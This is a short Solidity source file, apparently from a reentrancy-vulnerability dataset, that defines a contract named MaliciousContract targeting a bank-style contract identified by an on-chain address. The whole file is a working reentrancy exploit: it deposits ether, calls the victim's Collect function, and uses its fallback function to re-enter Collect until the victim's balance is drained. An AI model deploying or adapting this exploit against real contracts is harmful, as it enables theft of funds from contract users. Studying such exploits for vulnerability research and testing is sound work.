
pragma solidity ^0.4.19;

import "../dataset/reentrancy/0xaae1f51cf3339f18b6d3f3bdc75a5facd744b0b8.sol";

contract MaliciousContract{
    DEP_BANK dep_bank;
    

    constructor(address _victimAddress) public{
        dep_bank= DEP_BANK (_victimAddress);
    }

   function attack(uint amount) public {
        require(amount >= 1 ether, "Must attempt and attack with at least 1 ether");
        dep_bank.Collect(amount);
    }

    function deposit()  public payable{
        require(msg.value >= 1 ether, "Must add at least 1 ether");
        dep_bank.Deposit.value(msg.value)();        
    }

    function() payable public {
        // Re-enter the vulnerable function if there's still balance to collect
        if ( address(dep_bank).balance >= 1 ether) {
            dep_bank.Collect(1 ether);
        }
    }
}
